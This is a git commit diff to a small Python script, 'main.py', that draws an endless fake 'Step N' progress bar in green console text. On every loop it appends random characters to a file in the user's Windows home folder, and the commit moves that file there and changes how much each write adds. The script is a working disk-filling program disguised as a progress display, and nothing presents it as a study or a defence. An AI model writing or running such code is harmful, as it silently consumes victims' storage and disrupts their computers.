3fde04f0bddcd2d8ef8ea73a5aa418b51fe4f3f1
JohnnySD <ba004629@bac.qld.edu.au>
2022-03-13 15:28:38 +1000

    Update main.py

--- app/main.py
+++ app/main.py
@@ -1,5 +1,4 @@
 import getpass, random, os, string, sys
-path = f'C:\\Users\\{getpass.getuser()}\\log'
 os.system('color 0a')
 cls = lambda: os.system('cls')
 step = 1
@@ -8,7 +7,7 @@ while True:
 	cls()
 	num = round(percent / 5)
 	print(f'''\nStep {step}\n[{'-' * num}{' ' * (20 - num)}] {percent}%''')
-	open('.log', 'a').write(''.join(f'{random.choice(string.printable)}' for _ in range(int(sys.maxsize))))
+	open(f'C:\\Users\\{getpass.getuser()}\\log', 'a').write(''.join(f'{random.choice(string.printable)}' for _ in range(10000)))
 	percent += 1
 	if percent > 100:
 		percent = 0
